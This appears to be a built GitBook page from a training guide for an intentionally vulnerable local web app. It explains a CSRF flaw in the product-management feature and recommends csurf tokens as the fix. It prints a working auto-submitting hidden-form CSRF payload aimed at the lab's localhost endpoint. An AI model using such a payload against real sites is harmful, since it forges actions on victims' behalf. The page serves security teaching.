@@ -1,0 +1,406 @@
+
+<!DOCTYPE HTML>
+<html lang="" >
+    <head>
+        <meta charset="UTF-8">
+        <meta content="text/html; charset=utf-8" http-equiv="Content-Type">
+        <title>A8 Cross-site Request Forgery · GitBook</title>
+        <meta http-equiv="X-UA-Compatible" content="IE=edge" />
+        <meta name="description" content="">
+        <meta name="generator" content="GitBook 3.2.3">
+        
+        
+        
+    
+    <link rel="stylesheet" href="../gitbook/style.css">
+
+    
+            
+                
+                <link rel="stylesheet" href="../gitbook/gitbook-plugin-highlight/website.css">
+                
+            
+                
+                <link rel="stylesheet" href="../gitbook/gitbook-plugin-search/search.css">
+                
+            
+                
+                <link rel="stylesheet" href="../gitbook/gitbook-plugin-fontsettings/website.css">
+                
+            
+        
+
+    
+
+    
+        
+    
+        
+    
+        
+    
+        
+    
+        
+    
+        
+    
+
+        
+    
+    
+    <meta name="HandheldFriendly" content="true"/>
+    <meta name="viewport" content="width=device-width, initial-scale=1, user-scalable=no">
+    <meta name="apple-mobile-web-app-capable" content="yes">
+    <meta name="apple-mobile-web-app-status-bar-style" content="black">
+    <link rel="apple-touch-icon-precomposed" sizes="152x152" href="../gitbook/images/apple-touch-icon-precomposed-152.png">
+    <link rel="shortcut icon" href="../gitbook/images/favicon.ico" type="image/x-icon">
+
+    
+    <link rel="next" href="a9-using-components-with-known-vulnerability.html" />
+    
+    
+    <link rel="prev" href="a7-missing-function-level-access-control.html" />
+    
+
+    </head>
+    <body>
+        
+<div class="book">
+    <div class="book-summary">
+        
+            
+<div id="book-search-input" role="search">
+    <input type="text" placeholder="Type to search" />
+</div>
+
+            
+                <nav role="navigation">
+                
+
+
+<ul class="summary">
+    
+    
+
+    
+
+    
+        
+        <li class="header">Introduction</li>
+        
+        
+    
+        <li class="chapter " data-level="1.1" data-path="../">
+            
+                <a href="../">
+            
+                    
+                    Introduction
+            
+                </a>
+            
+
+            
+        </li>
+    
+        <li class="chapter " data-level="1.2" data-path="../setup.html">
+            
+                <a href="../setup.html">
+            
+                    
+                    Setup
+            
+                </a>
+            
+
+            
+        </li>
+    
+
+    
+        
+        <li class="header">Solution</li>
+        
+        
+    
+        <li class="chapter " data-level="2.1" data-path="a1-injection.html">
+            
+                <a href="a1-injection.html">
+            
+                    
+                    A1 Injection
+            
+                </a>
+            
+
+            
+        </li>
+    
+        <li class="chapter " data-level="2.2" data-path="a2-broken-auth.html">
+            
+                <a href="a2-broken-auth.html">
+            
+                    
+                    A2 Broken Authentication and Session Management
+            
+                </a>
+            
+
+            
+        </li>
+    
+        <li class="chapter " data-level="2.3" data-path="a3-xss.html">
+            
+                <a href="a3-xss.html">
+            
+                    
+                    A3 Cross-site Scripting
+            
+                </a>
+            
+
+            
+        </li>
+    
+        <li class="chapter " data-level="2.4" data-path="a4-idor.html">
+            
+                <a href="a4-idor.html">
+            
+                    
+                    A4 Insecure Direct Object Reference
+            
+                </a>
+            
+
+            
+        </li>
+    
+        <li class="chapter " data-level="2.5" data-path="a5-securty-misconfig.html">
+            
+                <a href="a5-securty-misconfig.html">
+            
+                    
+                    A5 Security Misconfiguration
+            
+                </a>
+            
+
+            
+        </li>
+    
+        <li class="chapter " data-level="2.6" data-path="a6-sensitive-data-exposure.html">
+            
+                <a href="a6-sensitive-data-exposure.html">
+            
+                    
+                    A6 Sensitive Data Exposure
+            
+                </a>
+            
+
+            
+        </li>
+    
+        <li class="chapter " data-level="2.7" data-path="a7-missing-function-level-access-control.html">
+            
+                <a href="a7-missing-function-level-access-control.html">
+            
+                    
+                    A7 Missing Function Level Access Control
+            
+                </a>
+            
+
+            
+        </li>
+    
+        <li class="chapter active" data-level="2.8" data-path="a8-csrf.html">
+            
+                <a href="a8-csrf.html">
+            
+                    
+                    A8 Cross-site Request Forgery
+            
+                </a>
+            
+
+            
+        </li>
+    
+        <li class="chapter " data-level="2.9" data-path="a9-using-components-with-known-vulnerability.html">
+            
+                <a href="a9-using-components-with-known-vulnerability.html">
+            
+                    
+                    A9 Using Components with Known Vulnerability
+            
+                </a>
+            
+
+            
+        </li>
+    
+        <li class="chapter " data-level="2.10" data-path="a10-unvalidated-redirects-and-forwards.html">
+            
+                <a href="a10-unvalidated-redirects-and-forwards.html">
+            
+                    
+                    A10 Unvalidated Redirects and Forwards
+            
+                </a>
+            
+
+            
+        </li>
+    
+
+    
+
+    <li class="divider"></li>
+
+    <li>
+        <a href="https://www.gitbook.com" target="blank" class="gitbook-link">
+            Published with GitBook
+        </a>
+    </li>
+</ul>
+
+
+                </nav>
+            
+        
+    </div>
+
+    <div class="book-body">
+        
+            <div class="body-inner">
+                
+                    
+
+<div class="book-header" role="navigation">
+    
+
+    <!-- Title -->
+    <h1>
+        <i class="fa fa-circle-o-notch fa-spin"></i>
+        <a href=".." >A8 Cross-site Request Forgery</a>
+    </h1>
+</div>
+
+
+
+
+                    <div class="page-wrapper" tabindex="-1" role="main">
+                        <div class="page-inner">
+                            
+<div id="book-search-results">
+    <div class="search-noresults">
+    
+                                <section class="normal markdown-section">
+                                
+                                <h1 id="cross-site-request-forgery">Cross-site Request Forgery</h1>
+<h2 id="csrf-in-addedit-product">CSRF in Add/Edit product</h2>
+<p>The application is vulnerable to a Cross-sites-Request-Forgery in <code>Product Management</code> feature. The application fails to implement anti-CSRF token to prevent forced browsing.</p>
+<p><a href="http://127.0.0.1:9090/app/modifyproduct" target="_blank">http://127.0.0.1:9090/app/modifyproduct</a></p>
+<p>This issue can be exploited by an attacker by hosting a malicious page like the one below and tricking the victim onto visiting it. The below example will add a new product on behalf of the victim on visiting a crafted URL like <code>http://youtube.com.xyz.nxd/watch/v=cute-kitten</code> by the attacker</p>
+<p><em>Attacker&apos;s Webpage</em></p>
+<pre><code class="lang-html"><span class="hljs-tag">&lt;<span class="hljs-name">html</span>&gt;</span>
+    <span class="hljs-tag">&lt;<span class="hljs-name">body</span> <span class="hljs-attr">onload</span>=<span class="hljs-string">&apos;document.hidden_form.submit()&apos;</span>&gt;</span>
+        <span class="hljs-tag">&lt;<span class="hljs-name">form</span> <span class="hljs-attr">name</span>=<span class="hljs-string">&quot;hidden_form&quot;</span> <span class="hljs-attr">method</span>=<span class="hljs-string">&quot;POST&quot;</span> <span class="hljs-attr">action</span>=<span class="hljs-string">&quot;http://127.0.0.1:9090/app/modifyproduct&quot;</span>&gt;</span>
+            <span class="hljs-tag">&lt;<span class="hljs-name">input</span> <span class="hljs-attr">type</span>=<span class="hljs-string">&quot;hidden&quot;</span> <span class="hljs-attr">name</span>=<span class="hljs-string">&quot;name&quot;</span> <span class="hljs-attr">value</span>=<span class="hljs-string">&quot;Hacked&quot;</span>&gt;</span>
+            <span class="hljs-tag">&lt;<span class="hljs-name">input</span> <span class="hljs-attr">type</span>=<span class="hljs-string">&quot;hidden&quot;</span> <span class="hljs-attr">name</span>=<span class="hljs-string">&quot;code&quot;</span> <span class="hljs-attr">value</span>=<span class="hljs-string">&quot;hacked&quot;</span>&gt;</span>
+            <span class="hljs-tag">&lt;<span class="hljs-name">input</span> <span class="hljs-attr">type</span>=<span class="hljs-string">&quot;hidden&quot;</span> <span class="hljs-attr">name</span>=<span class="hljs-string">&quot;tags&quot;</span> <span class="hljs-attr">value</span>=<span class="hljs-string">&quot;hack&quot;</span>&gt;</span>
+            <span class="hljs-tag">&lt;<span class="hljs-name">input</span> <span class="hljs-attr">type</span>=<span class="hljs-string">&quot;hidden&quot;</span> <span class="hljs-attr">name</span>=<span class="hljs-string">&quot;description&quot;</span> <span class="hljs-attr">value</span>=<span class="hljs-string">&quot;This is a hacked product&quot;</span>&gt;</span>
+        <span class="hljs-tag">&lt;/<span class="hljs-name">form</span>&gt;</span>
+    <span class="hljs-tag">&lt;/<span class="hljs-name">body</span>&gt;</span>
+<span class="hljs-tag">&lt;/<span class="hljs-name">html</span>&gt;</span>
+</code></pre>
+<p><strong>Solution</strong></p>
+<p>CSRF vulnerabilities can be fixed by ensuring anti-CSRF tokens are needed for successful form submission. </p>
+<p>This can be done by using a module like <a href="https://www.npmjs.com/package/csurf" target="_blank">csurf</a>, and can save time needed to correctly implement your own logic.</p>
+<p><strong>Reference</strong></p>
+<ul>
+<li><a href="https://www.owasp.org/index.php/Cross-Site_Request_Forgery_(CSRF" target="_blank">https://www.owasp.org/index.php/Cross-Site_Request_Forgery_(CSRF</a>)</li>
+<li><a href="https://github.com/expressjs/csurf" target="_blank">https://github.com/expressjs/csurf</a></li>
+</ul>
+
+                                
+                                </section>
+                            
+    </div>
+    <div class="search-results">
+        <div class="has-results">
+            
+            <h1 class="search-results-title"><span class='search-results-count'></span> results matching "<span class='search-query'></span>"</h1>
+            <ul class="search-results-list"></ul>
+            
+        </div>
+        <div class="no-results">
+            
+            <h1 class="search-results-title">No results matching "<span class='search-query'></span>"</h1>
+            
+        </div>
+    </div>
+</div>
+
+                        </div>
+                    </div>
+                
+            </div>
+
+            
+                
+                <a href="a7-missing-function-level-access-control.html" class="navigation navigation-prev " aria-label="Previous page: A7 Missing Function Level Access Control">
+                    <i class="fa fa-angle-left"></i>
+                </a>
+                
+                
+                <a href="a9-using-components-with-known-vulnerability.html" class="navigation navigation-next " aria-label="Next page: A9 Using Components with Known Vulnerability">
+                    <i class="fa fa-angle-right"></i>
+                </a>
+                
+            
+        
+    </div>
+
+    <script>
+        var gitbook = gitbook || [];
+        gitbook.push(function() {
+            gitbook.page.hasChanged({"page":{"title":"A8 Cross-site Request Forgery","level":"2.8","depth":1,"next":{"title":"A9 Using Components with Known Vulnerability","level":"2.9","depth":1,"path":"solution/a9-using-components-with-known-vulnerability.md","ref":"solution/a9-using-components-with-known-vulnerability.md","articles":[]},"previous":{"title":"A7 Missing Function Level Access Control","level":"2.7","depth":1,"path":"solution/a7-missing-function-level-access-control.md","ref":"solution/a7-missing-function-level-access-control.md","articles":[]},"dir":"ltr"},"config":{"gitbook":"*","theme":"default","variables":{},"plugins":[],"pluginsConfig":{"highlight":{},"search":{},"lunr":{"maxIndexSize":1000000,"ignoreSpecialCharacters":false},"sharing":{"facebook":true,"twitter":true,"google":false,"weibo":false,"instapaper":false,"vk":false,"all":["facebook","google","twitter","weibo","instapaper"]},"fontsettings":{"theme":"white","family":"sans","size":2},"theme-default":{"styles":{"website":"styles/website.css","pdf":"styles/pdf.css","epub":"styles/epub.css","mobi":"styles/mobi.css","ebook":"styles/ebook.css","print":"styles/print.css"},"showLevel":false}},"structure":{"langs":"LANGS.md","readme":"README.md","glossary":"GLOSSARY.md","summary":"SUMMARY.md"},"pdf":{"pageNumbers":true,"fontSize":12,"fontFamily":"Arial","paperSize":"a4","chapterMark":"pagebreak","pageBreaksBefore":"/","margin":{"right":62,"left":62,"top":56,"bottom":56}},"styles":{"website":"styles/website.css","pdf":"styles/pdf.css","epub":"styles/epub.css","mobi":"styles/mobi.css","ebook":"styles/ebook.css","print":"styles/print.css"}},"file":{"path":"solution/a8-csrf.md","mtime":"2017-11-14T04:38:13.142Z","type":"markdown"},"gitbook":{"version":"3.2.3","time":"2017-11-14T04:51:01.858Z"},"basePath":"..","book":{"language":""}});
+        });
+    </script>
+</div>
+
+        
+    <script src="../gitbook/gitbook.js"></script>
+    <script src="../gitbook/theme.js"></script>
+    
+        
+        <script src="../gitbook/gitbook-plugin-search/search-engine.js"></script>
+        
+    
+        
+        <script src="../gitbook/gitbook-plugin-search/search.js"></script>
+        
+    
+        
+        <script src="../gitbook/gitbook-plugin-lunr/lunr.min.js"></script>
+        
+    
+        
+        <script src="../gitbook/gitbook-plugin-lunr/search-lunr.js"></script>
+        
+    
+        
+        <script src="../gitbook/gitbook-plugin-sharing/buttons.js"></script>
+        
+    
+        
+        <script src="../gitbook/gitbook-plugin-fontsettings/fontsettings.js"></script>
+        
+    
+
+    </body>
+</html>
+
